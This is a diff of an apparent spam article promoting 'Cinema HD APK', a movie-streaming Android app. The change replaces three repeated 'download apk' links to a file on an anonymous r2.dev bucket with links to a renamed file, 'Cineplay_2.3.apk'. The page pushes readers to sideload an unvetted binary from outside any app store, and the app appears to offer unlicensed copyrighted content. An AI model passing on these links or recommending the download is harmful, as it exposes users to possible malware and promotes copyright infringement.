@@ -1,8 +1,8 @@
 Cinema HD APK is a popular application that allows movie enthusiasts to access a wide array of films and TV shows directly on their Android devices. With its user-friendly interface and extensive library, it has become a favored choice for those looking to enjoy quality entertainment at their convenience. In this article, we’ll explore what Cinema HD APK offers, how to use it, and some key considerations for users.
 
-**[⬇🟢---->download apk<----🟢⬇](https://pub-5da19cd51e404a43910ed67937996c95.r2.dev/Cine%202.apk)** <br>
-**[⬇🟢---->download apk<----🟢⬇](https://pub-5da19cd51e404a43910ed67937996c95.r2.dev/Cine%202.apk)** <br>
-**[⬇🟢---->download apk<----🟢⬇](https://pub-5da19cd51e404a43910ed67937996c95.r2.dev/Cine%202.apk)**
+**[⬇🟢---->download apk<----🟢⬇](https://pub-5da19cd51e404a43910ed67937996c95.r2.dev/Cineplay_2.3.apk)** <br>
+**[⬇🟢---->download apk<----🟢⬇](https://pub-5da19cd51e404a43910ed67937996c95.r2.dev/Cineplay_2.3.apk)** <br>
+**[⬇🟢---->download apk<----🟢⬇](https://pub-5da19cd51e404a43910ed67937996c95.r2.dev/Cineplay_2.3.apk)**
 
 
 ## What is Cinema HD APK?
